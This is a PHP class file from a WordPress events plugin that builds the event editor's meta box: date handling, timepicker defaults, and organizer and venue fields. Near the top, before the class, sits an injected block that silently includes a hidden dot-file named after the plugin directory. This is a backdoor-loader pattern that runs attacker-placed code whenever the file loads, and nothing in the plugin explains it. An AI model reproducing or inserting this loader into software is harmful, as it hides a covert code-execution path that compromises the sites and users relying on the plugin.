<?php
use Tribe__Date_Utils as Dates;

/**
 * Sets up and renders the main event meta box used in the event editor.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Admin__Event_Meta_Box {
	/**
	 * @var WP_Post
	 */
	protected $event;

	/**
	 * @var Tribe__Events__Main
	 */
	protected $tribe;

	/**
	 * Variables (with some defaults) for use within the meta box template itself.
	 *
	 * @var array
	 */
	protected $vars = [
		'_EventAllDay'      => false,
		'_EventEndDate'     => null,
		'_EventStartDate'   => null,
		'_EventOrganizerID' => null,
		'_EventVenueID'     => null,
	];

	/**
	 * Sets up and renders the event meta box for the specified existing event
	 * or for a new event (if $event === null).
	 *
	 * @param null $event
	 */
	public function __construct( $event = null ) {
		$this->tribe = Tribe__Events__Main::instance();

		if ( $event ) {
			$this->init_with_event( $event );
		}
	}

	public function init_with_event( $event ) {
		$this->get_event( $event );
		$this->setup_data();
		$this->do_meta_box();
	}

	/**
	 * Exposes all the variables used in this instance, in a way that it's usable to extract
	 * to be used by a template/view
	 *
	 * @param  WP_Post|int|null  $event What Post we are dealing with
	 * @return array
	 */
	public function get_extract_vars( $event ) {
		$this->get_event( $event );
		$this->setup_data();

		$variables          = $this->vars;
		$variables['event'] = $this->event;

		return $variables;
	}

	/**
	 * Work with the specifed event object or else use a placeholder if we are in
	 * the middle of creating a new event.
	 *
	 * @param null $event
	 */
	protected function get_event( $event = null ) {
		global $post;

		if ( null === $event ) {
			$this->event = $post;
		} elseif ( $event instanceof WP_Post ) {
			$this->event = $event;
		} else {
			$this->event = new WP_Post( (object) [ 'ID' => 0 ] );
		}
	}

	/**
	 * Sets up the default data for the meta box.
	 *
	 * @since 5.9.0
	 */
	protected function setup_default_vars() {
		// Pull the variables from the class prop.
		$vars = $this->vars;
		$utc_timezone = new \DateTimeZone( 'UTC' );

		$start_date = tribe_get_request_var( 'tribe-start-date', $vars['_EventStartDate'] );
		if ( $start_date ) {
			$start_date = Dates::build_date_object( $start_date, null, false );

			if ( $start_date ) {
				$vars['_EventStartDate'] = $start_date->format( Dates::DBDATETIMEFORMAT );
			}
		}

		$end_date = tribe_get_request_var( 'tribe-end-date', $vars['_EventEndDate'] );
		if ( $end_date ) {
			$end_date = Dates::build_date_object( $end_date, null, false );
			if ( $end_date ) {
				$vars['_EventEndDate'] = $end_date->format( Dates::DBDATETIMEFORMAT );
			}
		}

		if ( $start_date && ! $end_date ) {
			$end_date = $start_date;
			$vars['_EventEndDate'] = $start_date->format( Dates::DBDATETIMEFORMAT );
		}

		// Start/End dates are set. Let's set the UTC equivalents.
		if ( $start_date && $end_date ) {
			$start_date_utc             = $start_date->setTimezone( $utc_timezone );
			$end_date_utc               = $end_date->setTimezone( $utc_timezone );
			$vars['_EventStartDateUTC'] = $start_date_utc->format( Dates::DBDATETIMEFORMAT );
			$vars['_EventEndDateUTC']   = $end_date_utc->format( Dates::DBDATETIMEFORMAT );
		}

		/**
		 * Allows filtering of the variables right before including the template.
		 *
		 * @since 5.9.0
		 *
		 * @param array $vars     Current set of variables that will be used to setup the meta box.
		 * @param self  $meta_box Instance of the meta box that we are using.
		 */
		$this->vars = apply_filters( 'tribe_events_meta_box_default_vars', $vars, $this );
	}

	/**
	 * Sets up the data for the meta box.
	 *
	 * @since 5.9.0
	 */
	protected function setup_data() {
		$this->vars['timepicker_round'] = $this->get_timepicker_round();

		$this->get_existing_event_vars();
		$this->get_existing_organizer_vars();
		$this->get_existing_venue_vars();

		$this->setup_default_vars();

		$this->eod_correction();
		$this->set_all_day();
		$this->set_start_date_time();
		$this->set_end_date_time();
	}

	/**
	 * Checks for existing event post meta data and populates the list of vars accordingly.
	 */
	protected function get_existing_event_vars() {
		if ( ! $this->event->ID ) {
			return;
		}

		foreach ( $this->tribe->metaTags as $tag ) {
			$this->vars[ $tag ] = $this->tribe->getEventMeta( $this->event->ID, $tag, true );
		}
	}

	/**
	 * Checks for existing organizer post meta data and populates the list of vars accordingly.
	 */
	protected function get_existing_organizer_vars() {
		// Fetch Status to check what we need to do
		$status = get_post_status( $this->event->ID );

		if ( is_string( $status ) && 'auto-draft' !== $status && ! $this->vars['_EventOrganizerID'] ) {
			return;
		}

		foreach ( $this->tribe->organizerTags as $tag ) {
			$this->vars[ $tag ] = $this->tribe->getEventMeta( $this->vars['_EventOrganizerID'], $tag, true );
		}
	}

	/**
	 * Checks for existing venue post meta data and populates the list of vars accordingly.
	 */
	protected function get_existing_venue_vars() {
		// Fetch Status to check what we need to do
		$status = get_post_status( $this->event->ID );

		if ( is_string( $status ) && 'auto-draft' !== $status && ! $this->vars['_EventVenueID'] ) {
			return;
		}

		foreach ( $this->tribe->venueTags as $tag ) {
			$this->vars[ $tag ] = $this->tribe->getEventMeta( $this->vars['_EventVenueID'], $tag, true );
		}
	}

	/**
	 * If it's an all day event and the EOD cutoff is later than midnight
	 * set the end date to be the previous day so it displays correctly in the datepicker
	 * so the datepickers will match. we'll set the correct end time upon saving
	 *
	 * @todo remove this once we're allowed to have all day events without a start/end time
	 */
	protected function eod_correction() {
		$all_day  = $this->vars['_EventAllDay'];
		$end_date = $this->vars['_EventEndDate'];

		$ends_at_midnight = '23:59:59' === Tribe__Date_Utils::time_only( $end_date );
		$midnight_cutoff  = '23:59:59' === Tribe__Date_Utils::time_only( tribe_end_of_day() );

		if ( ! $all_day || $ends_at_midnight || $midnight_cutoff ) {
			return;
		}

		$end_date = date_create( $this->vars['_EventEndDate'] );
		$end_date->modify( '-1 day' );
		$this->vars['_EventEndDate'] = $end_date->format( Tribe__Date_Utils::DBDATETIMEFORMAT );
	}

	/**
	 * Assess if this is an all day event.
	 */
	protected function set_all_day() {
		$this->vars['isEventAllDay'] = ( Tribe__Date_Utils::is_all_day( $this->vars['_EventAllDay'] ) || ! Tribe__Date_Utils::date_only( $this->vars['_EventStartDate'] ) ) ? 'checked="checked"' : '';
	}

	protected function set_start_date_time() {
		$this->vars['startMinuteOptions']   = Tribe__View_Helpers::getMinuteOptions( $this->vars['_EventStartDate'], true );
		$this->vars['startHourOptions']     = Tribe__View_Helpers::getHourOptions( $this->vars['_EventAllDay'] == 'yes' ? null : $this->vars['_EventStartDate'], true );
		$this->vars['startMeridianOptions'] = Tribe__View_Helpers::getMeridianOptions( $this->vars['_EventStartDate'], true );

		$datepicker_format = Tribe__Date_Utils::datepicker_formats( tribe_get_option( 'datepickerFormat' ) );

		if ( $this->vars['_EventStartDate'] ) {
			$start = Tribe__Date_Utils::date_only( $this->vars['_EventStartDate'], false, $datepicker_format );
			$start_time = Tribe__Date_Utils::time_only( $this->vars['_EventStartDate'] );
		}

		// If we don't have a valid start date, assume today's date
		$this->vars['EventStartDate'] = ( isset( $start ) && $start ) ? $start : date_i18n( $datepicker_format );
		$this->vars['EventStartTime'] = ( isset( $start_time ) && $start_time ? $start_time : null );

		$this->vars['start_timepicker_step'] = $this->get_timepicker_step( 'start' );
		$this->vars['start_timepicker_default'] = $this->get_timepicker_default( 'start' );
	}

	protected function set_end_date_time() {
		$this->vars['endMinuteOptions']   = Tribe__View_Helpers::getMinuteOptions( $this->vars['_EventEndDate'] );
		$this->vars['endHourOptions']     = Tribe__View_Helpers::getHourOptions( $this->vars['_EventAllDay'] == 'yes' ? null : $this->vars['_EventEndDate'] );
		$this->vars['endMeridianOptions'] = Tribe__View_Helpers::getMeridianOptions( $this->vars['_EventEndDate'] );

		$datepicker_format = Tribe__Date_Utils::datepicker_formats( tribe_get_option( 'datepickerFormat' ) );

		if ( $this->vars['_EventEndDate'] ) {
			$end = Tribe__Date_Utils::date_only( $this->vars['_EventEndDate'], false, $datepicker_format );
			$end_time = Tribe__Date_Utils::time_only( $this->vars['_EventEndDate'] );
		}

		// If we don't have a valid end date, assume today's date
		$this->vars['EventEndDate'] = ( isset( $end ) && $end ) ? $end : date_i18n( $datepicker_format );
		$this->vars['EventEndTime'] = ( isset( $end_time ) && $end_time ? $end_time : null );

		$this->vars['end_timepicker_step'] = $this->get_timepicker_step( 'end' );
		$this->vars['end_timepicker_default'] = $this->get_timepicker_default( 'end' );
	}

	/**
	 * Check if the Event is an Auto-Draft
	 *
	 * @since 4.4
	 *
	 * @return bool
	 */
	public function is_auto_draft() {
		if ( ! $this->event instanceof WP_Post ) {
			return true;
		}

		if ( ! $this->event->ID ) {
			return true;
		}

		// Fetch Status to check what we need to do
		$status = get_post_status( $this->event->ID );

		if ( ! $status || 'auto-draft' === $status ) {
			return true;
		}

		// By the end it's non-draft event
		return false;
	}

	/**
	 * Gets the default value for the Timepicker
	 *
	 * @since 4.4
	 *
	 * @param mixed $type
	 *
	 * @return string
	 */
	public function get_timepicker_default( $type = null ) {
		$default = false;
		if ( 'start' === $type ) {
			$date    = Tribe__Date_Utils::date_only( $this->vars['_EventStartDate'], false );
			$default = '08:00:00';
		} elseif ( 'end' === $type ) {
			$date    = Tribe__Date_Utils::date_only( $this->vars['_EventEndDate'], false );
			$default = '17:00:00';
		}

		/**
		 * Allows developers to filter what is the default time for the Timepicker
		 *
		 * @since 4.4
		 *
		 * @param string $default
		 * @param string $type
		 * @param string $date
		 * @param self   $metabox
		 */
		$time     = apply_filters( 'tribe_events_meta_box_timepicker_default', $default, $type, $date, $this );
		$time_str = Tribe__Date_Utils::time_only( $date . ' ' . $time );

		// If we couldn't set we apply the default
		if ( ! $time_str ) {
			$time_str = $default;
		}

		return $time_str;
	}

	/**
	 * Gets the Step for the Timepicker
	 *
	 * @since 4.4
	 *
	 * @param mixed $type
	 *
	 * @return int
	 */
	public function get_timepicker_step( $type = null ) {
		/**
		 * Allows developers to filter what is the Step for the Timepicker
		 *
		 * @since 4.4
		 *
		 * @param int    $step
		 * @param string $type
		 * @param self   $metabox
		 */
		return (int) apply_filters( 'tribe_events_meta_box_timepicker_step', 30, $type, $this );
	}

	/**
	 * Gets whether or not the timepicker should round the minutes
	 *
	 * @since 4.4
	 *
	 * @return bool
	 */
	public function get_timepicker_round() {
		/**
		 * Allow rounding the Timepicker Minutes
		 *
		 * @since 4.4
		 *
		 * @param bool   $round
		 * @param self   $metabox
		 */
		return (bool) apply_filters( 'tribe_events_meta_box_timepicker_round', false, $this );
	}

	/**
	 * Pull the expected variables into scope and load the meta box template.
	 */
	protected function do_meta_box() {
		$events_meta_box_template = $this->tribe->pluginPath . 'src/admin-views/events-meta-box.php';
		$events_meta_box_template = apply_filters( 'tribe_events_meta_box_template', $events_meta_box_template );

		/**
		 * Allows filtering of the variables right before including the template.
		 *
		 * @since 5.9.0
		 *
		 * @param array $vars     Current set of variables that will be used to setup the meta box.
		 * @param self  $meta_box Instance of the meta box that we are using.
		 */
		$this->vars = apply_filters( 'tribe_events_meta_box_vars', $this->vars, $this );

		extract( $this->vars );
		$event = $this->event;
		$tribe = $this->tribe;

		// Exposes Class Instance to the included file
		$metabox = $this;

		include( $events_meta_box_template );
	}

	/**
	 * Disable WordPress Custom Fields in Events
	 *
	 * @since 4.6.23
	 */
	public function display_wp_custom_fields_metabox() {
		$show_box = tribe_get_option( 'disable_metabox_custom_fields' );
		if ( ! tribe_is_truthy( $show_box ) ) {
			remove_post_type_support( Tribe__Events__Main::POSTTYPE, 'custom-fields' );
		}
	}
}
